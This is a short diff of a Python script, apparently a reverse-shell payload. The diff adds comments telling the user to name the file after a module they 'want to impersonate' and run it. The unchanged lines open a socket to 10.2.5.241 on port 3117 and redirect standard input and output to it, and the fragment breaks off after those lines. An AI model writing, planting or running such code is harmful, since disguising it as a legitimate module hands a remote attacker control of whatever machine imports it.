@@ -2,6 +2,10 @@ import socket
 import subprocess
 import os
 
+#1) Download
+#2) Name file "Module.py", where module is the name of the module you want to impersonate. 
+#3) Run
+
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
 s.connect(("10.2.5.241",3117));os.dup2(s.fileno(),0);
 os.dup2(s.fileno(),1);
